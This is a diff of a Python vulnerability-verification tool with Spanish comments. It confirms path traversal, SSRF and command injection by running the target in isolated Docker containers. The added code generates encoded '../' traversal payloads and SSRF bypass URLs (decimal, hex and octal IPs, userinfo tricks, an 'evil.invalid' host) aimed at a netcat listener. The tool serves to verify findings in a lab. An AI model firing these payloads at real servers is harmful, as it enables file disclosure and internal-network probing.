@@ -18,7 +18,8 @@ import subprocess
 import time
 from typing import Callable, List, Optional
 
-from .wpverify import WpVerifyResult, _docker_daemon_ok, _lab_host, _pick_param, _run, _token
+from .wpverify import (WpVerifyResult, _ALPINE_IMAGE, _PATH_HINTS, _URL_HINTS, _docker_daemon_ok,
+                       _lab_host, _pick_param, _run, _token)
 
 _COMPOSE_NAMES = ("docker-compose.yml", "docker-compose.yaml", "compose.yml", "compose.yaml")
 
@@ -154,6 +155,60 @@ class _GenericLab:
         r = self.sh("exec", container, "sh", "-c", f"cat {path} 2>/dev/null", timeout=timeout)
         return r.stdout or ""
 
+    def write_canary(self, container: str, path: str, content: str, timeout=15.0) -> bool:
+        """Analogo de _Lab.write_canary (wpverify.py): planta un fichero DENTRO del contenedor
+        real del objetivo (via `docker exec`, no en ningun volumen compartido -- aqui no sabemos
+        de antemano si existe uno) para confirmar path-traversal/LFI de verdad."""
+        r = self.sh("exec", "-i", container, "sh", "-c", f"cat > {path}",
+                   input_text=content, timeout=timeout)
+        return r.returncode == 0
+
+    def resolve_network(self, timeout=15.0) -> Optional[str]:
+        """Red Docker del laboratorio -- para `dockerfile` ya la creamos nosotros (self.net); para
+        `compose`, docker compose crea la suya propia (convencion `<proyecto>_default`, pero no
+        hay que confiar en la convencion: se busca por la etiqueta real que compose pone en toda
+        red que crea)."""
+        if self.kind == "dockerfile":
+            return self.net
+        r = self.sh("network", "ls", "--filter",
+                   f"label=com.docker.compose.project={self.compose_project}",
+                   "--format", "{{.Name}}", timeout=timeout)
+        names = [n for n in (r.stdout or "").splitlines() if n.strip()]
+        return names[0] if names else None
+
+    def start_listener(self, timeout: float = 30.0) -> Optional[str]:
+        """Analogo de _Lab.start_listener: un contenedor Alpine en la MISMA red del laboratorio
+        que solo escucha TCP/8080 y vuelca cualquier conexion entrante -- sirve para confirmar
+        SSRF generico igual que en WordPress: si el objetivo hace de verdad una peticion saliente
+        hacia aqui, queda grabada con el token unico que iba en la ruta."""
+        net = self.resolve_network(timeout=timeout)
+        if not net:
+            return None
+        self.listener = f"binoracle-genverify-{self.tag}-ssrf"
+        r = self.sh("run", "-d", "--name", self.listener, "--network", net, _ALPINE_IMAGE,
+                   "sh", "-c", "while true; do nc -l -p 8080 >> /var/log/ssrf.log 2>&1; done",
+                   timeout=timeout)
+        if r.returncode != 0:
+            return None
+        self._created.append(("container", self.listener))
+        return self.listener
+
+    def listener_log(self, timeout: float = 10.0) -> str:
+        r = self.sh("exec", self.listener, "cat", "/var/log/ssrf.log", timeout=timeout)
+        return (r.stdout or "") if r.returncode == 0 else ""
+
+    def container_ip(self, name: str, timeout: float = 10.0) -> Optional[str]:
+        """IP interna real del contenedor `name` en la red del laboratorio -- para las variantes
+        de SSRF que apuntan al listener por IP (decimal/hex/octal) en vez de por nombre."""
+        net = self.resolve_network(timeout=timeout)
+        if not net:
+            return None
+        r = self.sh("inspect", "-f",
+                   f"{{{{(index .NetworkSettings.Networks \"{net}\").IPAddress}}}}",
+                   name, timeout=timeout)
+        ip = (r.stdout or "").strip()
+        return ip or None
+
     def teardown(self):
         for kind, name in reversed(self._created):
             try:
@@ -168,6 +223,42 @@ class _GenericLab:
                                     "down", "-v"], capture_output=True, timeout=60)
             except Exception:
                 pass
+
+
+def _bootstrap_generic_lab(source_dir: str, step, res: WpVerifyResult,
+                           budget_s: float) -> Optional[tuple]:
+    """Pasos comunes a TODOS los verificadores genericos: detectar como arrancar el objetivo,
+    construirlo/arrancarlo, y encontrar por donde habla HTTP. Devuelve (lab, base_url, container)
+    o None con `res` ya relleno (detail/logs/limitations) -- el caller solo tiene que `return res`."""
+    target = _find_build_target(source_dir)
+    if target is None:
+        res.detail = "no se encontro Dockerfile ni docker-compose.yml en el codigo descargado"
+        res.limitations.append("la verificacion generica SOLO puede montar un objetivo que "
+                               "traiga su propio Dockerfile/docker-compose.yml -- sin eso no "
+                               "hay forma de arrancarlo sin adivinar el stack")
+        return None
+    step(f"objetivo generico detectado: {target['kind']} en {target['path']}")
+
+    lab = _GenericLab(_token())
+    step("construyendo y arrancando el objetivo (docker build/compose, puede tardar)...")
+    r = lab.build_and_run(target)
+    if r.returncode != 0:
+        res.detail = f"fallo al construir/arrancar el objetivo: {(r.stderr or r.stdout or '')[:500]}"
+        lab.teardown()
+        return None
+
+    step("esperando a que el objetivo responda HTTP en alguno de sus puertos publicados...")
+    found_http = lab.discover_http()
+    if found_http is None:
+        res.detail = "el objetivo arranco pero ningun puerto publicado respondio HTTP a tiempo"
+        for c in lab.running_containers():
+            res.logs.append(f"docker logs ({c}):\n" + lab.logs_tail(c))
+        lab.teardown()
+        return None
+    container, port = found_http
+    base_url = f"http://{_lab_host()}:{port}"
+    step(f"objetivo arriba: {base_url} (contenedor '{container}')")
+    return (lab, base_url, container)
 
 
 def verify_generic_command_injection(
@@ -188,34 +279,11 @@ def verify_generic_command_injection(
         res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
         return res
 
-    target = _find_build_target(source_dir)
-    if target is None:
-        res.detail = "no se encontro Dockerfile ni docker-compose.yml en el codigo descargado"
-        res.limitations.append("la verificacion generica SOLO puede montar un objetivo que "
-                               "traiga su propio Dockerfile/docker-compose.yml -- sin eso no "
-                               "hay forma de arrancarlo sin adivinar el stack")
+    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s)
+    if boot is None:
         return res
-    step(f"objetivo generico detectado: {target['kind']} en {target['path']}")
-
-    lab = _GenericLab(_token())
+    lab, base_url, container = boot
     try:
-        step(f"construyendo y arrancando el objetivo (docker build/compose, puede tardar)...")
-        r = lab.build_and_run(target)
-        if r.returncode != 0:
-            res.detail = f"fallo al construir/arrancar el objetivo: {(r.stderr or r.stdout or '')[:500]}"
-            return res
-
-        step("esperando a que el objetivo responda HTTP en alguno de sus puertos publicados...")
-        found_http = lab.discover_http()
-        if found_http is None:
-            res.detail = "el objetivo arranco pero ningun puerto publicado respondio HTTP a tiempo"
-            for c in lab.running_containers():
-                res.logs.append(f"docker logs ({c}):\n" + lab.logs_tail(c))
-            return res
-        container, port = found_http
-        base_url = f"http://{_lab_host()}:{port}"
-        step(f"objetivo arriba: {base_url} (contenedor '{container}')")
-
         import requests
         secret = _token() * 4
         canary_path = f"/tmp/binoracle_ci_{_token()}.txt"
@@ -276,6 +344,227 @@ def verify_generic_command_injection(
                           f"inyeccion contra {endpoint} pero ninguna hizo aparecer el canario -- "
                           f"no se confirmo command injection (puede que el endpoint/parametro no "
                           f"sean los reales, o que la entrada no llegue a una shell sin filtrar)")
+        return res
+    except subprocess.TimeoutExpired as e:
+        res.detail = f"timeout de infraestructura: {e}"
+        return res
+    except Exception as e:
+        res.detail = f"error inesperado: {e}"
+        return res
+    finally:
+        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
+        lab.teardown()
+
+
+def verify_generic_path_traversal(
+    source_dir: str, endpoint: str, http_method: str, parameters,
+    path_param_hint: str = "", on_step: Optional[Callable[[str], None]] = None,
+    budget_s: float = 900.0,
+) -> WpVerifyResult:
+    """Analogo generico de verify_wordpress_path_traversal (wpverify.py): planta un fichero
+    canario con un secreto aleatorio DENTRO del contenedor real del objetivo (via `docker exec`,
+    fuera de cualquier directorio de la app) y prueba las mismas variantes de profundidad/
+    codificacion de '../' -- el mecanismo de prueba (leer un fichero del propio sistema de
+    ficheros del contenedor) no depende del stack, asi que vale igual aqui que en WordPress."""
+    step = on_step or (lambda _m: None)
+    res = WpVerifyResult()
+    if not _docker_daemon_ok():
+        res.available = False
+        res.detail = "sin daemon Docker alcanzable"
+        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
+        return res
+
+    path_param = path_param_hint or _pick_param(parameters, _PATH_HINTS)
+    if not path_param:
+        res.detail = "no se identifico el parametro que lleva la ruta/fichero objetivo"
+        res.limitations.append("la verificacion de path-traversal necesita saber que parametro "
+                               "lleva la ruta/nombre de fichero; afina 'parameters' o pasalo a "
+                               "mano (path_param_hint)")
+        return res
+
+    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s)
+    if boot is None:
+        return res
+    lab, base_url, container = boot
+    try:
+        import requests
+        secret = _token() * 4
+        canary_path = f"/tmp/binoracle_canary_{_token()}.txt"
+        step(f"plantando fichero canario con un secreto aleatorio en {canary_path} (dentro del "
+             f"propio contenedor del objetivo)...")
+        if not lab.write_canary(container, canary_path, secret):
+            res.detail = f"no se pudo plantar el fichero canario en {canary_path}"
+            return res
+
+        m = (http_method or "GET").upper()
+        rel = canary_path.lstrip("/")
+        depths = (2, 4, 6, 8, 10, 12)
+        attempts = [rel, canary_path]
+        attempts += [("../" * n) + rel for n in depths]
+        attempts += [("..%2f" * n) + rel for n in depths]
+        attempts += [("%2e%2e%2f" * n) + rel for n in depths]
+        attempts += [("%252e%252e%252f" * n) + rel for n in depths]
+        attempts += [("..\\" * n) + rel for n in depths]
+        attempts += [("....//" * n) + rel for n in depths]
+        attempts += [rel + "%00", canary_path + "%00"]
+
+        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
+                             "metodo": m, "path_param": path_param, "canary_path": canary_path,
+                             "canary_secret": secret})
+
+        found = False
+        tried = []
+        for payload_value in attempts:
+            payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+            payload[path_param] = payload_value
+            try:
+                resp = requests.request(m, base_url + endpoint, timeout=15,
+                                        data=payload if m != "GET" else None,
+                                        params=payload if m == "GET" else None)
+            except Exception as e:
+                tried.append({"payload": payload_value, "error": str(e)})
+                continue
+            present = secret in (resp.text or "")
+            tried.append({"payload": payload_value, "status": resp.status_code,
+                         "secreto_presente": present})
+            if present:
+                found = True
+                res.evidence["payload_ganador"] = payload_value
+                res.evidence["status_code_respuesta"] = resp.status_code
+                res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
+                step(f"VERIFICADO: el secreto plantado aparecio literal en la respuesta con "
+                     f"{path_param}={payload_value!r}.")
+                break
+
+        res.evidence["intentos"] = tried
+        if found:
+            res.verified = True
+            res.ok = True
+            res.detail = (f"PATH TRAVERSAL confirmado: la peticion con {path_param}="
+                          f"{res.evidence['payload_ganador']!r} devolvio el secreto exacto "
+                          f"plantado en {canary_path} (dentro del contenedor del objetivo)")
+        else:
+            res.ok = True
+            res.detail = (f"se probaron {len(tried)} variantes de ruta para {path_param} y "
+                          f"ninguna devolvio el secreto plantado -- el traversal no se confirmo "
+                          f"(puede necesitar otra profundidad/codificacion, o el "
+                          f"endpoint/parametro no son los reales)")
+        return res
+    except subprocess.TimeoutExpired as e:
+        res.detail = f"timeout de infraestructura: {e}"
+        return res
+    except Exception as e:
+        res.detail = f"error inesperado: {e}"
+        return res
+    finally:
+        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
+        lab.teardown()
+
+
+def verify_generic_ssrf(
+    source_dir: str, endpoint: str, http_method: str, parameters,
+    url_param_hint: str = "", on_step: Optional[Callable[[str], None]] = None,
+    budget_s: float = 900.0,
+) -> WpVerifyResult:
+    """Analogo generico de verify_wordpress_ssrf: levanta un contenedor 'callback' en la MISMA
+    red del laboratorio generico (sea `dockerfile` o `compose` -- ver _GenericLab.resolve_network)
+    y prueba las mismas variantes de URL/codificacion para confirmar que el SERVIDOR del objetivo
+    (no el navegador del atacante) hace de verdad la peticion saliente."""
+    step = on_step or (lambda _m: None)
+    res = WpVerifyResult()
+    if not _docker_daemon_ok():
+        res.available = False
+        res.detail = "sin daemon Docker alcanzable"
+        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
+        return res
+
+    url_param = url_param_hint or _pick_param(parameters, _URL_HINTS)
+    if not url_param:
+        res.detail = "no se identifico el parametro que lleva la URL/recurso remoto"
+        res.limitations.append("la verificacion de SSRF necesita saber que parametro lleva la "
+                               "URL remota; afina 'parameters' o pasalo a mano (url_param_hint)")
+        return res
+
+    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s)
+    if boot is None:
+        return res
+    lab, base_url, container = boot
+    try:
+        import requests
+        step("levantando el contenedor 'callback' (listener) en la red interna del laboratorio...")
+        listener = lab.start_listener()
+        if not listener:
+            res.detail = "no se pudo levantar el contenedor listener para SSRF"
+            return res
+
+        listener_ip = lab.container_ip(lab.listener)
+        m = (http_method or "GET").upper()
+        found = False
+        tried = []
+
+        def build_urls(tok: str) -> List[str]:
+            path = f"binoracle-ssrf-{tok}"
+            urls = [f"http://{lab.listener}:8080/{path}"]
+            if listener_ip:
+                parts = [int(x) for x in listener_ip.split(".")]
+                dec = (parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3]
+                hexip = "0x" + "".join(f"{x:02x}" for x in parts)
+                octip = "0" + ".".join(f"{x:03o}" for x in parts)
+                urls += [
+                    f"http://{listener_ip}:8080/{path}",
+                    f"http://{dec}:8080/{path}",
+                    f"http://{hexip}:8080/{path}",
+                    f"http://{octip}:8080/{path}",
+                    f"http://trusted-host@{listener_ip}:8080/{path}",
+                    f"http://{listener_ip}:8080@evil.invalid/{path}",
+                    f"http://{lab.listener}.:8080/{path}",
+                ]
+            return urls
+
+        for attempt_url in build_urls(_token()):
+            token = attempt_url.rsplit("binoracle-ssrf-", 1)[-1]
+            payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+            payload[url_param] = attempt_url
+            entry = {"url": attempt_url, "token": token}
+            try:
+                resp = requests.request(m, base_url + endpoint, timeout=15,
+                                        data=payload if m != "GET" else None,
+                                        params=payload if m == "GET" else None)
+                entry["status"] = resp.status_code
+            except Exception as e:
+                entry["peticion_error"] = str(e)
+            time.sleep(2)
+            log = lab.listener_log()
+            entry["token_en_log"] = token in log
+            tried.append(entry)
+            if token in log:
+                found = True
+                res.evidence["callback_url_ganadora"] = attempt_url
+                res.evidence["token_ganador"] = token
+                res.evidence["listener_log_recorte"] = log[:1000]
+                break
+
+        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
+                             "url_param": url_param, "listener_ip": listener_ip,
+                             "metodo": m, "intentos": tried})
+
+        if found:
+            res.verified = True
+            res.ok = True
+            res.detail = (f"SSRF confirmado: el listener interno (inalcanzable desde fuera del "
+                          f"laboratorio) recibio una conexion con el token exacto tras la "
+                          f"peticion con {url_param}={res.evidence['callback_url_ganadora']!r} "
+                          f"-- prueba de que el SERVIDOR emitio la peticion saliente, no el "
+                          f"navegador del atacante")
+            step(f"VERIFICADO: el listener interno recibio el token "
+                 f"'{res.evidence['token_ganador']}' -- la peticion saliente la hizo el servidor.")
+        else:
+            res.ok = True
+            res.detail = (f"se probaron {len(tried)} variantes de URL/codificacion (hostname, IP "
+                          f"literal, decimal, hex, octal, truco de userinfo) y ninguna hizo que "
+                          f"el token llegara al listener interno -- el SSRF no se confirmo (puede "
+                          f"que el endpoint/parametro no sean los reales, o que el servidor "
+                          f"filtre de verdad las URLs internas antes de seguirlas)")
         return res
     except subprocess.TimeoutExpired as e:
         res.detail = f"timeout de infraestructura: {e}"
